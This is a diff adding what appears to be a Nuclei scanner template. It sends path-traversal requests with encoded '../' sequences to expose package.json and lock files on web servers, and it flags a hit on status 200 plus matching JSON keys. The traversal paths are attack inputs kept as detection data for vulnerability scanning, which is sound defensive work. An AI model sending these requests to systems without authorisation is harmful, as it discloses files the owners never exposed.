@@ -1,0 +1,35 @@
+id: path-traversal-package
+
+info:
+  name: Path Travesal Package File Disclosure
+  author: reewardius
+  severity: info
+  reference:
+    - https://learn.microsoft.com/en-us/nuget/reference/packages-config
+    - https://github.com/maurosoria/dirsearch/blob/master/db/dicc.txt
+  tags: lfi,lfr,generic,dependency
+    
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/assets/built%2F..%2F..%2F/package.json'
+      - '{{BaseURL}}/%2F..%2F..%2F/package.json'
+      - '{{BaseURL}}/static../package.json'
+      - '{{BaseURL}}/static../package.json.lock'
+      - '{{BaseURL}}/assets../package.json'
+      - '{{BaseURL}}/assets../package.json.lock'
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'name'
+          - 'version'
+          - 'author'
+        condition: and
+        
+      - type: status
+        status:
+          - 200
